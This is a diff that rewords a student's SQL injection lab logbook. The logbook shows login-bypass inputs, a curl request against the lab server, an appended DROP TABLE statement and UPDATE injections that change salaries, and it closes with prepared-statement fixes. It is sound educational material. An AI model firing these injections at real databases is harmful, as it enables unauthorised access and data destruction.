@@ -1,16 +1,16 @@
 # SQL Injection LogBook
 
-This logbook pretends to documentante the work that was made in the SQL Injection lab, deduce some conclusions, identify the errors that were commited as well as to suggest the mosifications that would make the system secure to this type of attacks.
+This logbook documents the exploration and findings in the SQL Injection lab. It aims to analyze the vulnerabilities, identify errors, and propose modifications to enhance system security against such attacks.
 
 ## Task 1
 
-This first task is to adapt to the environment. We must use:
+The initial task involves adapting to the environment using the MySQL command line:
 
 ```sh
 mysql -u root -pdees
 ```
 
-and then we can use this
+Followed by listing the tables:
 
 ```sh
 show tables;
@@ -19,7 +19,7 @@ show tables;
 
 ## Task 2
 
-In this attack, we were presented to the php file that is being ran under the server side.
+The focus is on a PHP file running on the server, handling user authentication:
 
 ```php
 $input_uname = $_GET[’username’];
@@ -33,13 +33,13 @@ $sql = "SELECT id, name, eid, salary, birth, ssn, address, email,
 $result = $conn -> query($sql);
 ```
 
-and then, the form looks like this:
+The associated form:
 
 ![Form1](images/LOGBOOK8/form1.png)
 
 ### Task 2.1 - Attack from webpage
 
-Considering that we know the code, it is really easy to exploit this vulnerability:
+Exploiting the vulnerability with a crafted input:
 
 `username: admin'; -- `
 
@@ -57,7 +57,7 @@ This approach works, because the sql statement that will be queried to the datab
 
 ### Task 2.2 - Attack from command line
 
-After that, the approach that was made was exaclty the same, but in the command line, it will go like this:
+Executing a similar attack from the command line:
 
 ```sh
 curl ’www.seed-server.com/unsafe_home.php?username=admin%27%20--%20&Password=<anything>’
@@ -67,7 +67,7 @@ This approach works and the justification is similar to task 2.1
 
 ### Task 2.3 - Append a new SQL statement
 
-The next challange is to try to add a new sql statement in the project. Here is a way of how to do that:
+Attempting to add a new SQL statement:
 
 `username: admin'; DROP TABLE credential; -- `
 
@@ -83,11 +83,11 @@ This approach will lead to a query like this:
         WHERE name= ’admin’; DROP TABLE credential; -- and Password=’<anything>";
 ```
 
-However, this query does not let to drop the table `creentia`. That occurs because the `$conn -> query($sql)` only executes the first query as a protection measure.
+Explanation: The attempt fails due to the protection mechanism executing only the first query.
 
 ## Task 3
 
-Here is the php code that executes the query that will update the database after editing the profile
+Examining PHP code for updating user profiles:
 
 ```php
 $hashed_pwd = sha1($input_pwd);
@@ -101,13 +101,13 @@ WHERE ID=$id;";
 $conn->query($sql);
 ```
 
-The form looks like this:
+The associated form:
 
 ![Form2](images/LOGBOOK8/form2.png)
 
 ### Task 3.1 - Modify own salary
 
-To do so, the parameters would be
+Crafting input for modifying own salary:
 
 `nickname: <nickname>', salary = 1000000 WHERE nickname = <nickname>; -- `
 
@@ -127,6 +127,8 @@ UPDATE credential SET
 ```
 
 ### Task 3.2 - Reduce the Boby's salary
+
+Crafting input for reducing Boby's salary:
 
 `nickname: Boby', salary = 1 WHERE nickname = Boby; -- `
 
@@ -168,7 +170,7 @@ UPDATE credential SET
 
 Here are some suggestations to make this kind of attacks more difficult to occur:
 
-1. Use Parameterized Statements (Prepared Statements). This will help to distinguish between the sql code and the sql data. Something like:
+1. Use Parameterized Statements (Prepared Statements) to distinguish between SQL code and data:
 
 ```php
 $input_uname = $_GET['username'];
@@ -185,5 +187,5 @@ $stmt->execute();
 $result = $stmt->get_result();
 ```
 
-2. Input validation using regular expressions and others
+2. Implement input validation using regular expressions and other techniques.
 
